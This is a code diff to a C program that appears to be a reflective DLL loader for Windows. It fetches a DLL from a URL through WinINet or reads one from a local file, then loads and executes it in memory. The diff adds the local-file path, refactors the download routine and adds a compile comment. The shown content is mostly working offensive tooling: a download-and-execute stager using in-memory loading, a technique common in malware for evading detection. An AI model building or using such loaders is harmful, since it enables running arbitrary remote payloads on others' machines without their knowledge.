@@ -7,6 +7,13 @@
 
 // Define the signature of the Reflective Loader function in the target DLL
 // (We will use the standard DllMain entry point for this implementation)
+//
+/* This program loads and executes a DLL in memory from a file or URL
+ *
+ * Compile EXE:
+ *
+ * $ x86_64-w64-mingw32-gcc remote_dll_loader.c -o remote_dll_loader.exe -lwininet
+*/
 typedef DWORD(WINAPI* REFLECTIVELOADER)(VOID);
 
 
@@ -195,83 +202,108 @@ int ReflectivelyLoadAndExecute(LPVOID pDllBuffer, DWORD dwLength) {
     return (int)dwResult;
 }
 
+// --- NEW: Helper to load a DLL from a local file ---
+unsigned char* LoadLocalFile(LPCSTR szPath, DWORD* pdwLength) {
+    // 1. Pre-flight check: Does the file actually exist?
+    DWORD dwAttrib = GetFileAttributesA(szPath);
 
-int main(int argc, char *argv[]) {
-    HINTERNET hInternet;
-    HINTERNET hConnect;
-    DWORD dwBytesRead;
-    DWORD dwTotalBytesRead = 0;
-    DWORD dwChunkSize = 1024 * 4; // 4KB chunks
-    LPVOID pDllBuffer = NULL;
-    DWORD dwCurrentBufferSize = 0;
-    
-    if (argc != 2) {
-        printf("Usage: %s <URL_TO_DLL>\n", argv[0]);
-        return 1;
+    if (dwAttrib == INVALID_FILE_ATTRIBUTES) {
+        printf("[-] Error: File '%s' does not exist.\n", szPath);
+        return NULL;
     }
-    LPCSTR szUrl = argv[1];
 
-    printf("Attempting to retrieve bird food from: %s\n", szUrl);
+    if (dwAttrib & FILE_ATTRIBUTE_DIRECTORY) {
+        printf("[-] Error: '%s' is a directory, not a DLL file.\n", szPath);
+        return NULL;
+    }
 
-    // 1. Initialize WinINet
+    // 2. Proceed to open the file
+    HANDLE hFile = CreateFileA(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[-] Failed to open local file. Error: %lu\n", GetLastError());
+        return NULL;
+    }
+
+    *pdwLength = GetFileSize(hFile, NULL);
+    if (*pdwLength == 0 || *pdwLength == INVALID_FILE_SIZE) {
+        printf("[-] Error: File is empty or invalid size.\n");
+        CloseHandle(hFile);
+        return NULL;
+    }
+
+    // 3. Allocate and Read
+    unsigned char* buffer = (unsigned char*)malloc(*pdwLength);
+    if (buffer) {
+        DWORD bytesRead;
+        if (!ReadFile(hFile, buffer, *pdwLength, &bytesRead, NULL)) {
+            printf("[-] Failed to read file data. Error: %lu\n", GetLastError());
+            free(buffer);
+            buffer = NULL;
+        }
+    }
+
+    CloseHandle(hFile);
+    return buffer;
+}
+
+// --- NEW: Helper to load a DLL from a URL (Your original logic) ---
+unsigned char* LoadRemoteUrl(LPCSTR szUrl, DWORD* pdwLength) {
+    HINTERNET hInternet, hConnect;
+    DWORD dwBytesRead, dwTotalBytesRead = 0;
+    unsigned char* pDllBuffer = NULL;
+
     hInternet = InternetOpenA("ReflectiveLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (hInternet == NULL) {
-        printf("InternetOpenA failed: %lu\n", GetLastError());
-        return 1;
-    }
+    if (!hInternet) return NULL;
 
-    // 2. Open the URL
     hConnect = InternetOpenUrlA(hInternet, szUrl, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE, 0);
-    if (hConnect == NULL) {
-        printf("InternetOpenUrlA failed: %lu\n", GetLastError());
+    if (!hConnect) {
         InternetCloseHandle(hInternet);
-        return 1;
+        return NULL;
     }
 
-    // 3. Read the file into memory
-    printf("Downloading gibblets...\n");
-    do {
-        char buffer[dwChunkSize];
-        if (!InternetReadFile(hConnect, buffer, dwChunkSize, &dwBytesRead)) {
-            printf("InternetReadFile failed: %lu\n", GetLastError());
-            break;
-        }
+    unsigned char chunk[4096];
+    while (InternetReadFile(hConnect, chunk, sizeof(chunk), &dwBytesRead) && dwBytesRead > 0) {
+        pDllBuffer = (unsigned char*)realloc(pDllBuffer, dwTotalBytesRead + dwBytesRead);
+        memcpy(pDllBuffer + dwTotalBytesRead, chunk, dwBytesRead);
+        dwTotalBytesRead += dwBytesRead;
+    }
 
-        if (dwBytesRead == 0) break; // End of file
-
-        // Reallocate memory to fit the new chunk
-        dwCurrentBufferSize += dwBytesRead;
-        pDllBuffer = (pDllBuffer == NULL) 
-                     ? malloc(dwCurrentBufferSize)
-                     : realloc(pDllBuffer, dwCurrentBufferSize);
-
-        if (pDllBuffer == NULL) {
-            printf("Memory allocation failed.\n");
-            break;
-        }
-
-        // Copy the data into the buffer
-        memcpy((char *)pDllBuffer + (dwTotalBytesRead), buffer, dwBytesRead);
-        dwTotalBytesRead = dwCurrentBufferSize;
-
-    } while (dwBytesRead > 0);
-
-    printf("Download complete. Total size: %lu bytes\n", dwTotalBytesRead);
-
-    // 4. Cleanup WinINet handles
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
-    
-    // 5. Reflectively Load and Execute
-    int result = -1;
-    if (dwTotalBytesRead > 0) {
-        result = ReflectivelyLoadAndExecute(pDllBuffer, dwTotalBytesRead);
+    *pdwLength = dwTotalBytesRead;
+    return pDllBuffer;
+}
+
+// --- UPDATED MAIN ---
+int main(int argc, char *argv[]) {
+    if (argc != 2) {
+        printf("Usage: %s <URL or Local Path>\n", argv[0]);
+        return 1;
     }
-    
-    // 6. Free the buffer
-    if (pDllBuffer != NULL) {
-        free(pDllBuffer);
+
+    LPCSTR szTarget = argv[1];
+    unsigned char* pDllBuffer = NULL;
+    DWORD dwTotalBytesRead = 0;
+
+    // Determine if we are loading from web or disk
+    if (strncmp(szTarget, "http", 4) == 0) {
+        printf("[+] Target identified as URL. Downloading...\n");
+        pDllBuffer = LoadRemoteUrl(szTarget, &dwTotalBytesRead);
+    } else {
+        printf("[+] Target identified as local file. Reading...\n");
+        pDllBuffer = LoadLocalFile(szTarget, &dwTotalBytesRead);
     }
+
+    if (pDllBuffer == NULL || dwTotalBytesRead == 0) {
+        printf("[-] Failed to acquire DLL data from target.\n");
+        return 1;
+    }
+
+    printf("[+] Data acquired (%lu bytes). Starting reflective load...\n", dwTotalBytesRead);
+
+    int result = ReflectivelyLoadAndExecute(pDllBuffer, dwTotalBytesRead);
+
+    if (pDllBuffer) free(pDllBuffer);
     
     return result;
 }
